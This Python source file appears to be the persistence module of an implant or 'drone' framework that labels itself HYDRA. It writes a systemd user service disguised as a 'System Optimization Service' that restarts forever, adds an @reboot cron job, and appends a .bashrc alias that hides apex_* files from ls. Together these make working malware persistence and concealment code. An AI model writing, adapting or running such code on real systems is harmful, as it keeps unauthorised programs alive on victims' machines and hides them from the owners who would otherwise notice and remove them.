import os
import sys
from rich.console import Console

console = Console()

class ServiceDaemon:
    """
    Persistence Manager.
    Ensures the drone survives reboots.
    """
    def __init__(self):
        self.script_path = os.path.abspath(sys.argv[0])

    def persist(self):
        console.print("[HYDRA] 🐍 Engaging Persistence Protocols...")
        self._systemd_user()
        self._cron_job()
        self._bash_alias()

    def _systemd_user(self):
        """
        Creates a systemd user service.
        """
        try:
            config_dir = os.path.expanduser("~/.config/systemd/user")
            os.makedirs(config_dir, exist_ok=True)

            service_content = f"""
[Unit]
Description=System Optimization Service
[Service]
ExecStart=/usr/bin/python3 {self.script_path}
Restart=always
[Install]
WantedBy=default.target
"""
            with open(f"{config_dir}/apex_framework.service", "w") as f:
                f.write(service_content)

            # Enable
            os.system("systemctl --user enable apex_framework 2>/dev/null")
            console.print("[HYDRA] ✅ Systemd User Service Installed.")
        except Exception as e:
            console.print(f"[HYDRA] ⚠️ Systemd Failed: {e}")

    def _cron_job(self):
        """
        Adds @reboot cron.
        """
        try:
            job = f"@reboot /usr/bin/python3 {self.script_path}"
            # Check existing
            existing = os.popen("crontab -l 2>/dev/null").read()
            if self.script_path not in existing:
                cmd = f'(crontab -l 2>/dev/null; echo "{job}") | crontab -'
                os.system(cmd)
                console.print("[HYDRA] ✅ Cron Job Installed.")
        except: pass

    def _bash_alias(self):
        """
        Fallback hiding via alias.
        """
        try:
            bashrc = os.path.expanduser("~/.bashrc")
            alias = "alias ls='ls --hide=apex_*'"
            with open(bashrc, "a") as f:
                f.write(f"\n{alias}\n")
        except: pass
